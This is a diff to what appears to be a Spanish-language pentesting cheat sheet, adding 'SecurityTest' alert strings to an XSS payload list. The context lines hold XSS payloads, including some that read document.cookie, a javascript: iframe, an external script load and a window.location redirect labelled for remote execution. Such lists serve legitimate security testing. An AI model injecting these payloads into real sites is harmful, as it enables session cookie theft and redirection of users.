@@ -168,7 +168,7 @@ En upload file
 
 #XSS
 http://xss.rocks/xss.js
-<script>alert("test");</script>
+<script>alert("SecurityTest");</script>
 %3cscript%3ealert%28123%29%3c%2fscript%3e
         <iframe src=http://></iframe>
 	<img src=x onerror="&#97&#108&#101&#114&#116&#96&#120&#115&#115&#96">
@@ -180,6 +180,7 @@ http://xss.rocks/xss.js
 		<img src="" />
 		<img src="" onerror="alert(document.cookie)" />
 		<iframe src="javascript:alert('Hacked');" />
+		<iframe src="javascript:alert('SecurityTest');" />
         <script>alert(document.cookie)</script> Para obtener la cookie de sesión
 	href="javascript:alert('test')"
         <script>window.location="http://URL CON ALGO A EJECUTAR, COMO UNA SHELL"</script> Para ejecutar algo de forma remota
